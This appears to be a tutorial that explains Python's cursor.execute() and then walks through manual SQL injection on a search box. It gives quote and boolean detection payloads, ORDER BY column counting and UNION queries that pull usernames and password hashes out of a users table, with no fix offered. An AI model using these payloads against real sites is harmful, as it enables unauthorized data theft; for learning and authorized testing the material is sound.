## `cursor.execute()` — Explained

### What is a Cursor?

When your Python app connects to a database, it creates a **connection**. From that connection, you create a **cursor** — think of it as a *pen* that writes and reads from the database.

```python
import sqlite3

connection = sqlite3.connect("mydb.db")  # Connect to DB
cursor = connection.cursor()             # Create the cursor (your "pen")
```

### How `cursor.execute()` Works

It simply **sends your SQL query to the database and runs it**.

```python
# Step 1: Connect
connection = sqlite3.connect("mydb.db")

# Step 2: Create cursor
cursor = connection.cursor()

# Step 3: Execute a query
cursor.execute("SELECT * FROM users WHERE username = 'alice'")

# Step 4: Fetch the result
result = cursor.fetchall()
print(result)  # [('alice', 'password123', 'admin')]
```

Think of it like this:

```
Your Python Code
      ↓
  cursor.execute("SQL query")
      ↓
   Database Engine
      ↓
   Returns Result
      ↓
  cursor.fetchall()
```

---

## Testing SQL Injection on a Search Box

### How a Search Box Works (Behind the Scenes)

When you type `laptop` in a search box, the app runs:

```sql
SELECT * FROM products WHERE name = 'laptop';
```

The app just pastes your input directly into that query.

---

## Step-by-Step: How Many Requests to Find SQL Injection

Testing is done in **stages**. Each stage sends a few requests to confirm vulnerability and then exploit it.

---

### Stage 1 — Detecting the Vulnerability (2–3 requests)

**Request 1:** Type a single quote to break the query

```
'
```

App builds:
```sql
SELECT * FROM products WHERE name = ''';  -- ← Syntax error!
```

**What you look for:** An error message like:
```
You have an error in your SQL syntax near "'"
```
✅ This confirms SQL injection is possible.

---

**Request 2:** Test with always-true condition

```
' OR '1'='1
```

App builds:
```sql
SELECT * FROM products WHERE name = '' OR '1'='1';
```
**What you look for:** Returns **all products** instead of nothing → vulnerable.

---

**Request 3:** Test with always-false condition

```
' AND '1'='2
```

App builds:
```sql
SELECT * FROM products WHERE name = '' AND '1'='2';
```
**What you look for:** Returns **nothing** → confirms boolean-based injection works.

---

### Stage 2 — Finding Number of Columns (3–5 requests)

You use `ORDER BY` to find how many columns the table has:

```
' ORDER BY 1--    ✅ No error
' ORDER BY 2--    ✅ No error
' ORDER BY 3--    ✅ No error
' ORDER BY 4--    ❌ Error! → Table has 3 columns
```

Each one is **one request**. So ~3–5 requests typically.

---

### Stage 3 — Extracting Data with UNION (2–4 requests)

Now you inject a `UNION` to pull data from other tables:

**Request:** Find which columns display on screen:
```
' UNION SELECT 1,2,3--
```

App builds:
```sql
SELECT * FROM products WHERE name = '' UNION SELECT 1,2,3--;
```

If you see `1`, `2`, or `3` on the page → those column positions are visible.

---

**Request:** Extract usernames and passwords:
```
' UNION SELECT username, password, 3 FROM users--
```

App builds:
```sql
SELECT * FROM products WHERE name = '' 
UNION SELECT username, password, 3 FROM users--;
```

**Result on page:**
```
admin        | 5f4dcc3b5aa765...
alice        | abc123hash...
```

---
